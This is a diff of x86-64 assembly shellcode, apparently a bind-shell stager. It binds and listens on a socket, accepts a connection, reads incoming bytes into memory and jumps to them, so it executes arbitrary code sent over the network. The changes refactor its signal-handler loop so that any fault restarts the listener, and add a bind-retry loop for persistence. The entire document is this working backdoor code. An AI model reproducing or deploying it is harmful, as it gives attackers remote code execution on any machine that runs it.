@@ -32,24 +32,8 @@ __start:
 ; so we can assume all GPRs are zero
 
 fd:
-    push rax
-    push rax 
-    push (SA_NODEFER | SA_RESTORER)
-    push restore
-    push rsp
-    pop rsi
-    push 31
-    pop rdi
-
-.loop:
-    push 13
-    pop rax
-    cdq
-    push 0x8
-    pop r10
-    syscall
-    dec edi
-    jnz .loop
+    mov ebx, restore1
+    call sigreg
 
 main:
     xchg esi, edi
@@ -61,21 +45,28 @@ main:
     cdq
     syscall
     mov dword [fd], eax
-    xchg edi, eax
-    push rbx
+restore1:
+    mov edi, dword [fd]
+    push 0
     mov dword [rsp], SOCKADDR
     push rsp
     pop rsi
+.bind_retry:
     push 0x10
     pop rdx
     push 0x31 ; SYS_bind
     pop rax
     syscall
+    test eax, eax
+    jnz .bind_retry
     push 0x32 ; SYS_listen
     pop rax
     mov esi, eax
     syscall
-restore:
+    push restore2
+    pop rbx
+    call sigreg
+restore2:
     mov edi, dword [fd]
     xor esi, esi
     push 0x2b ; SYS_accept
@@ -99,3 +90,28 @@ restore:
     pop rdi
     syscall ; SYS_read
     jmp rsi
+
+sigreg:
+    ; arg1(rbx): sa_handler
+    push 0
+    push 0 
+    push (SA_NODEFER | SA_RESTORER)
+    push rbx
+    push rsp
+    pop rsi
+    push 31
+    pop rdi
+
+.loop:
+    push 13
+    pop rax
+    cdq
+    push 0x8
+    pop r10
+    syscall
+    dec edi
+    jnz .loop
+
+    add rsp, 0x20
+    ret
+
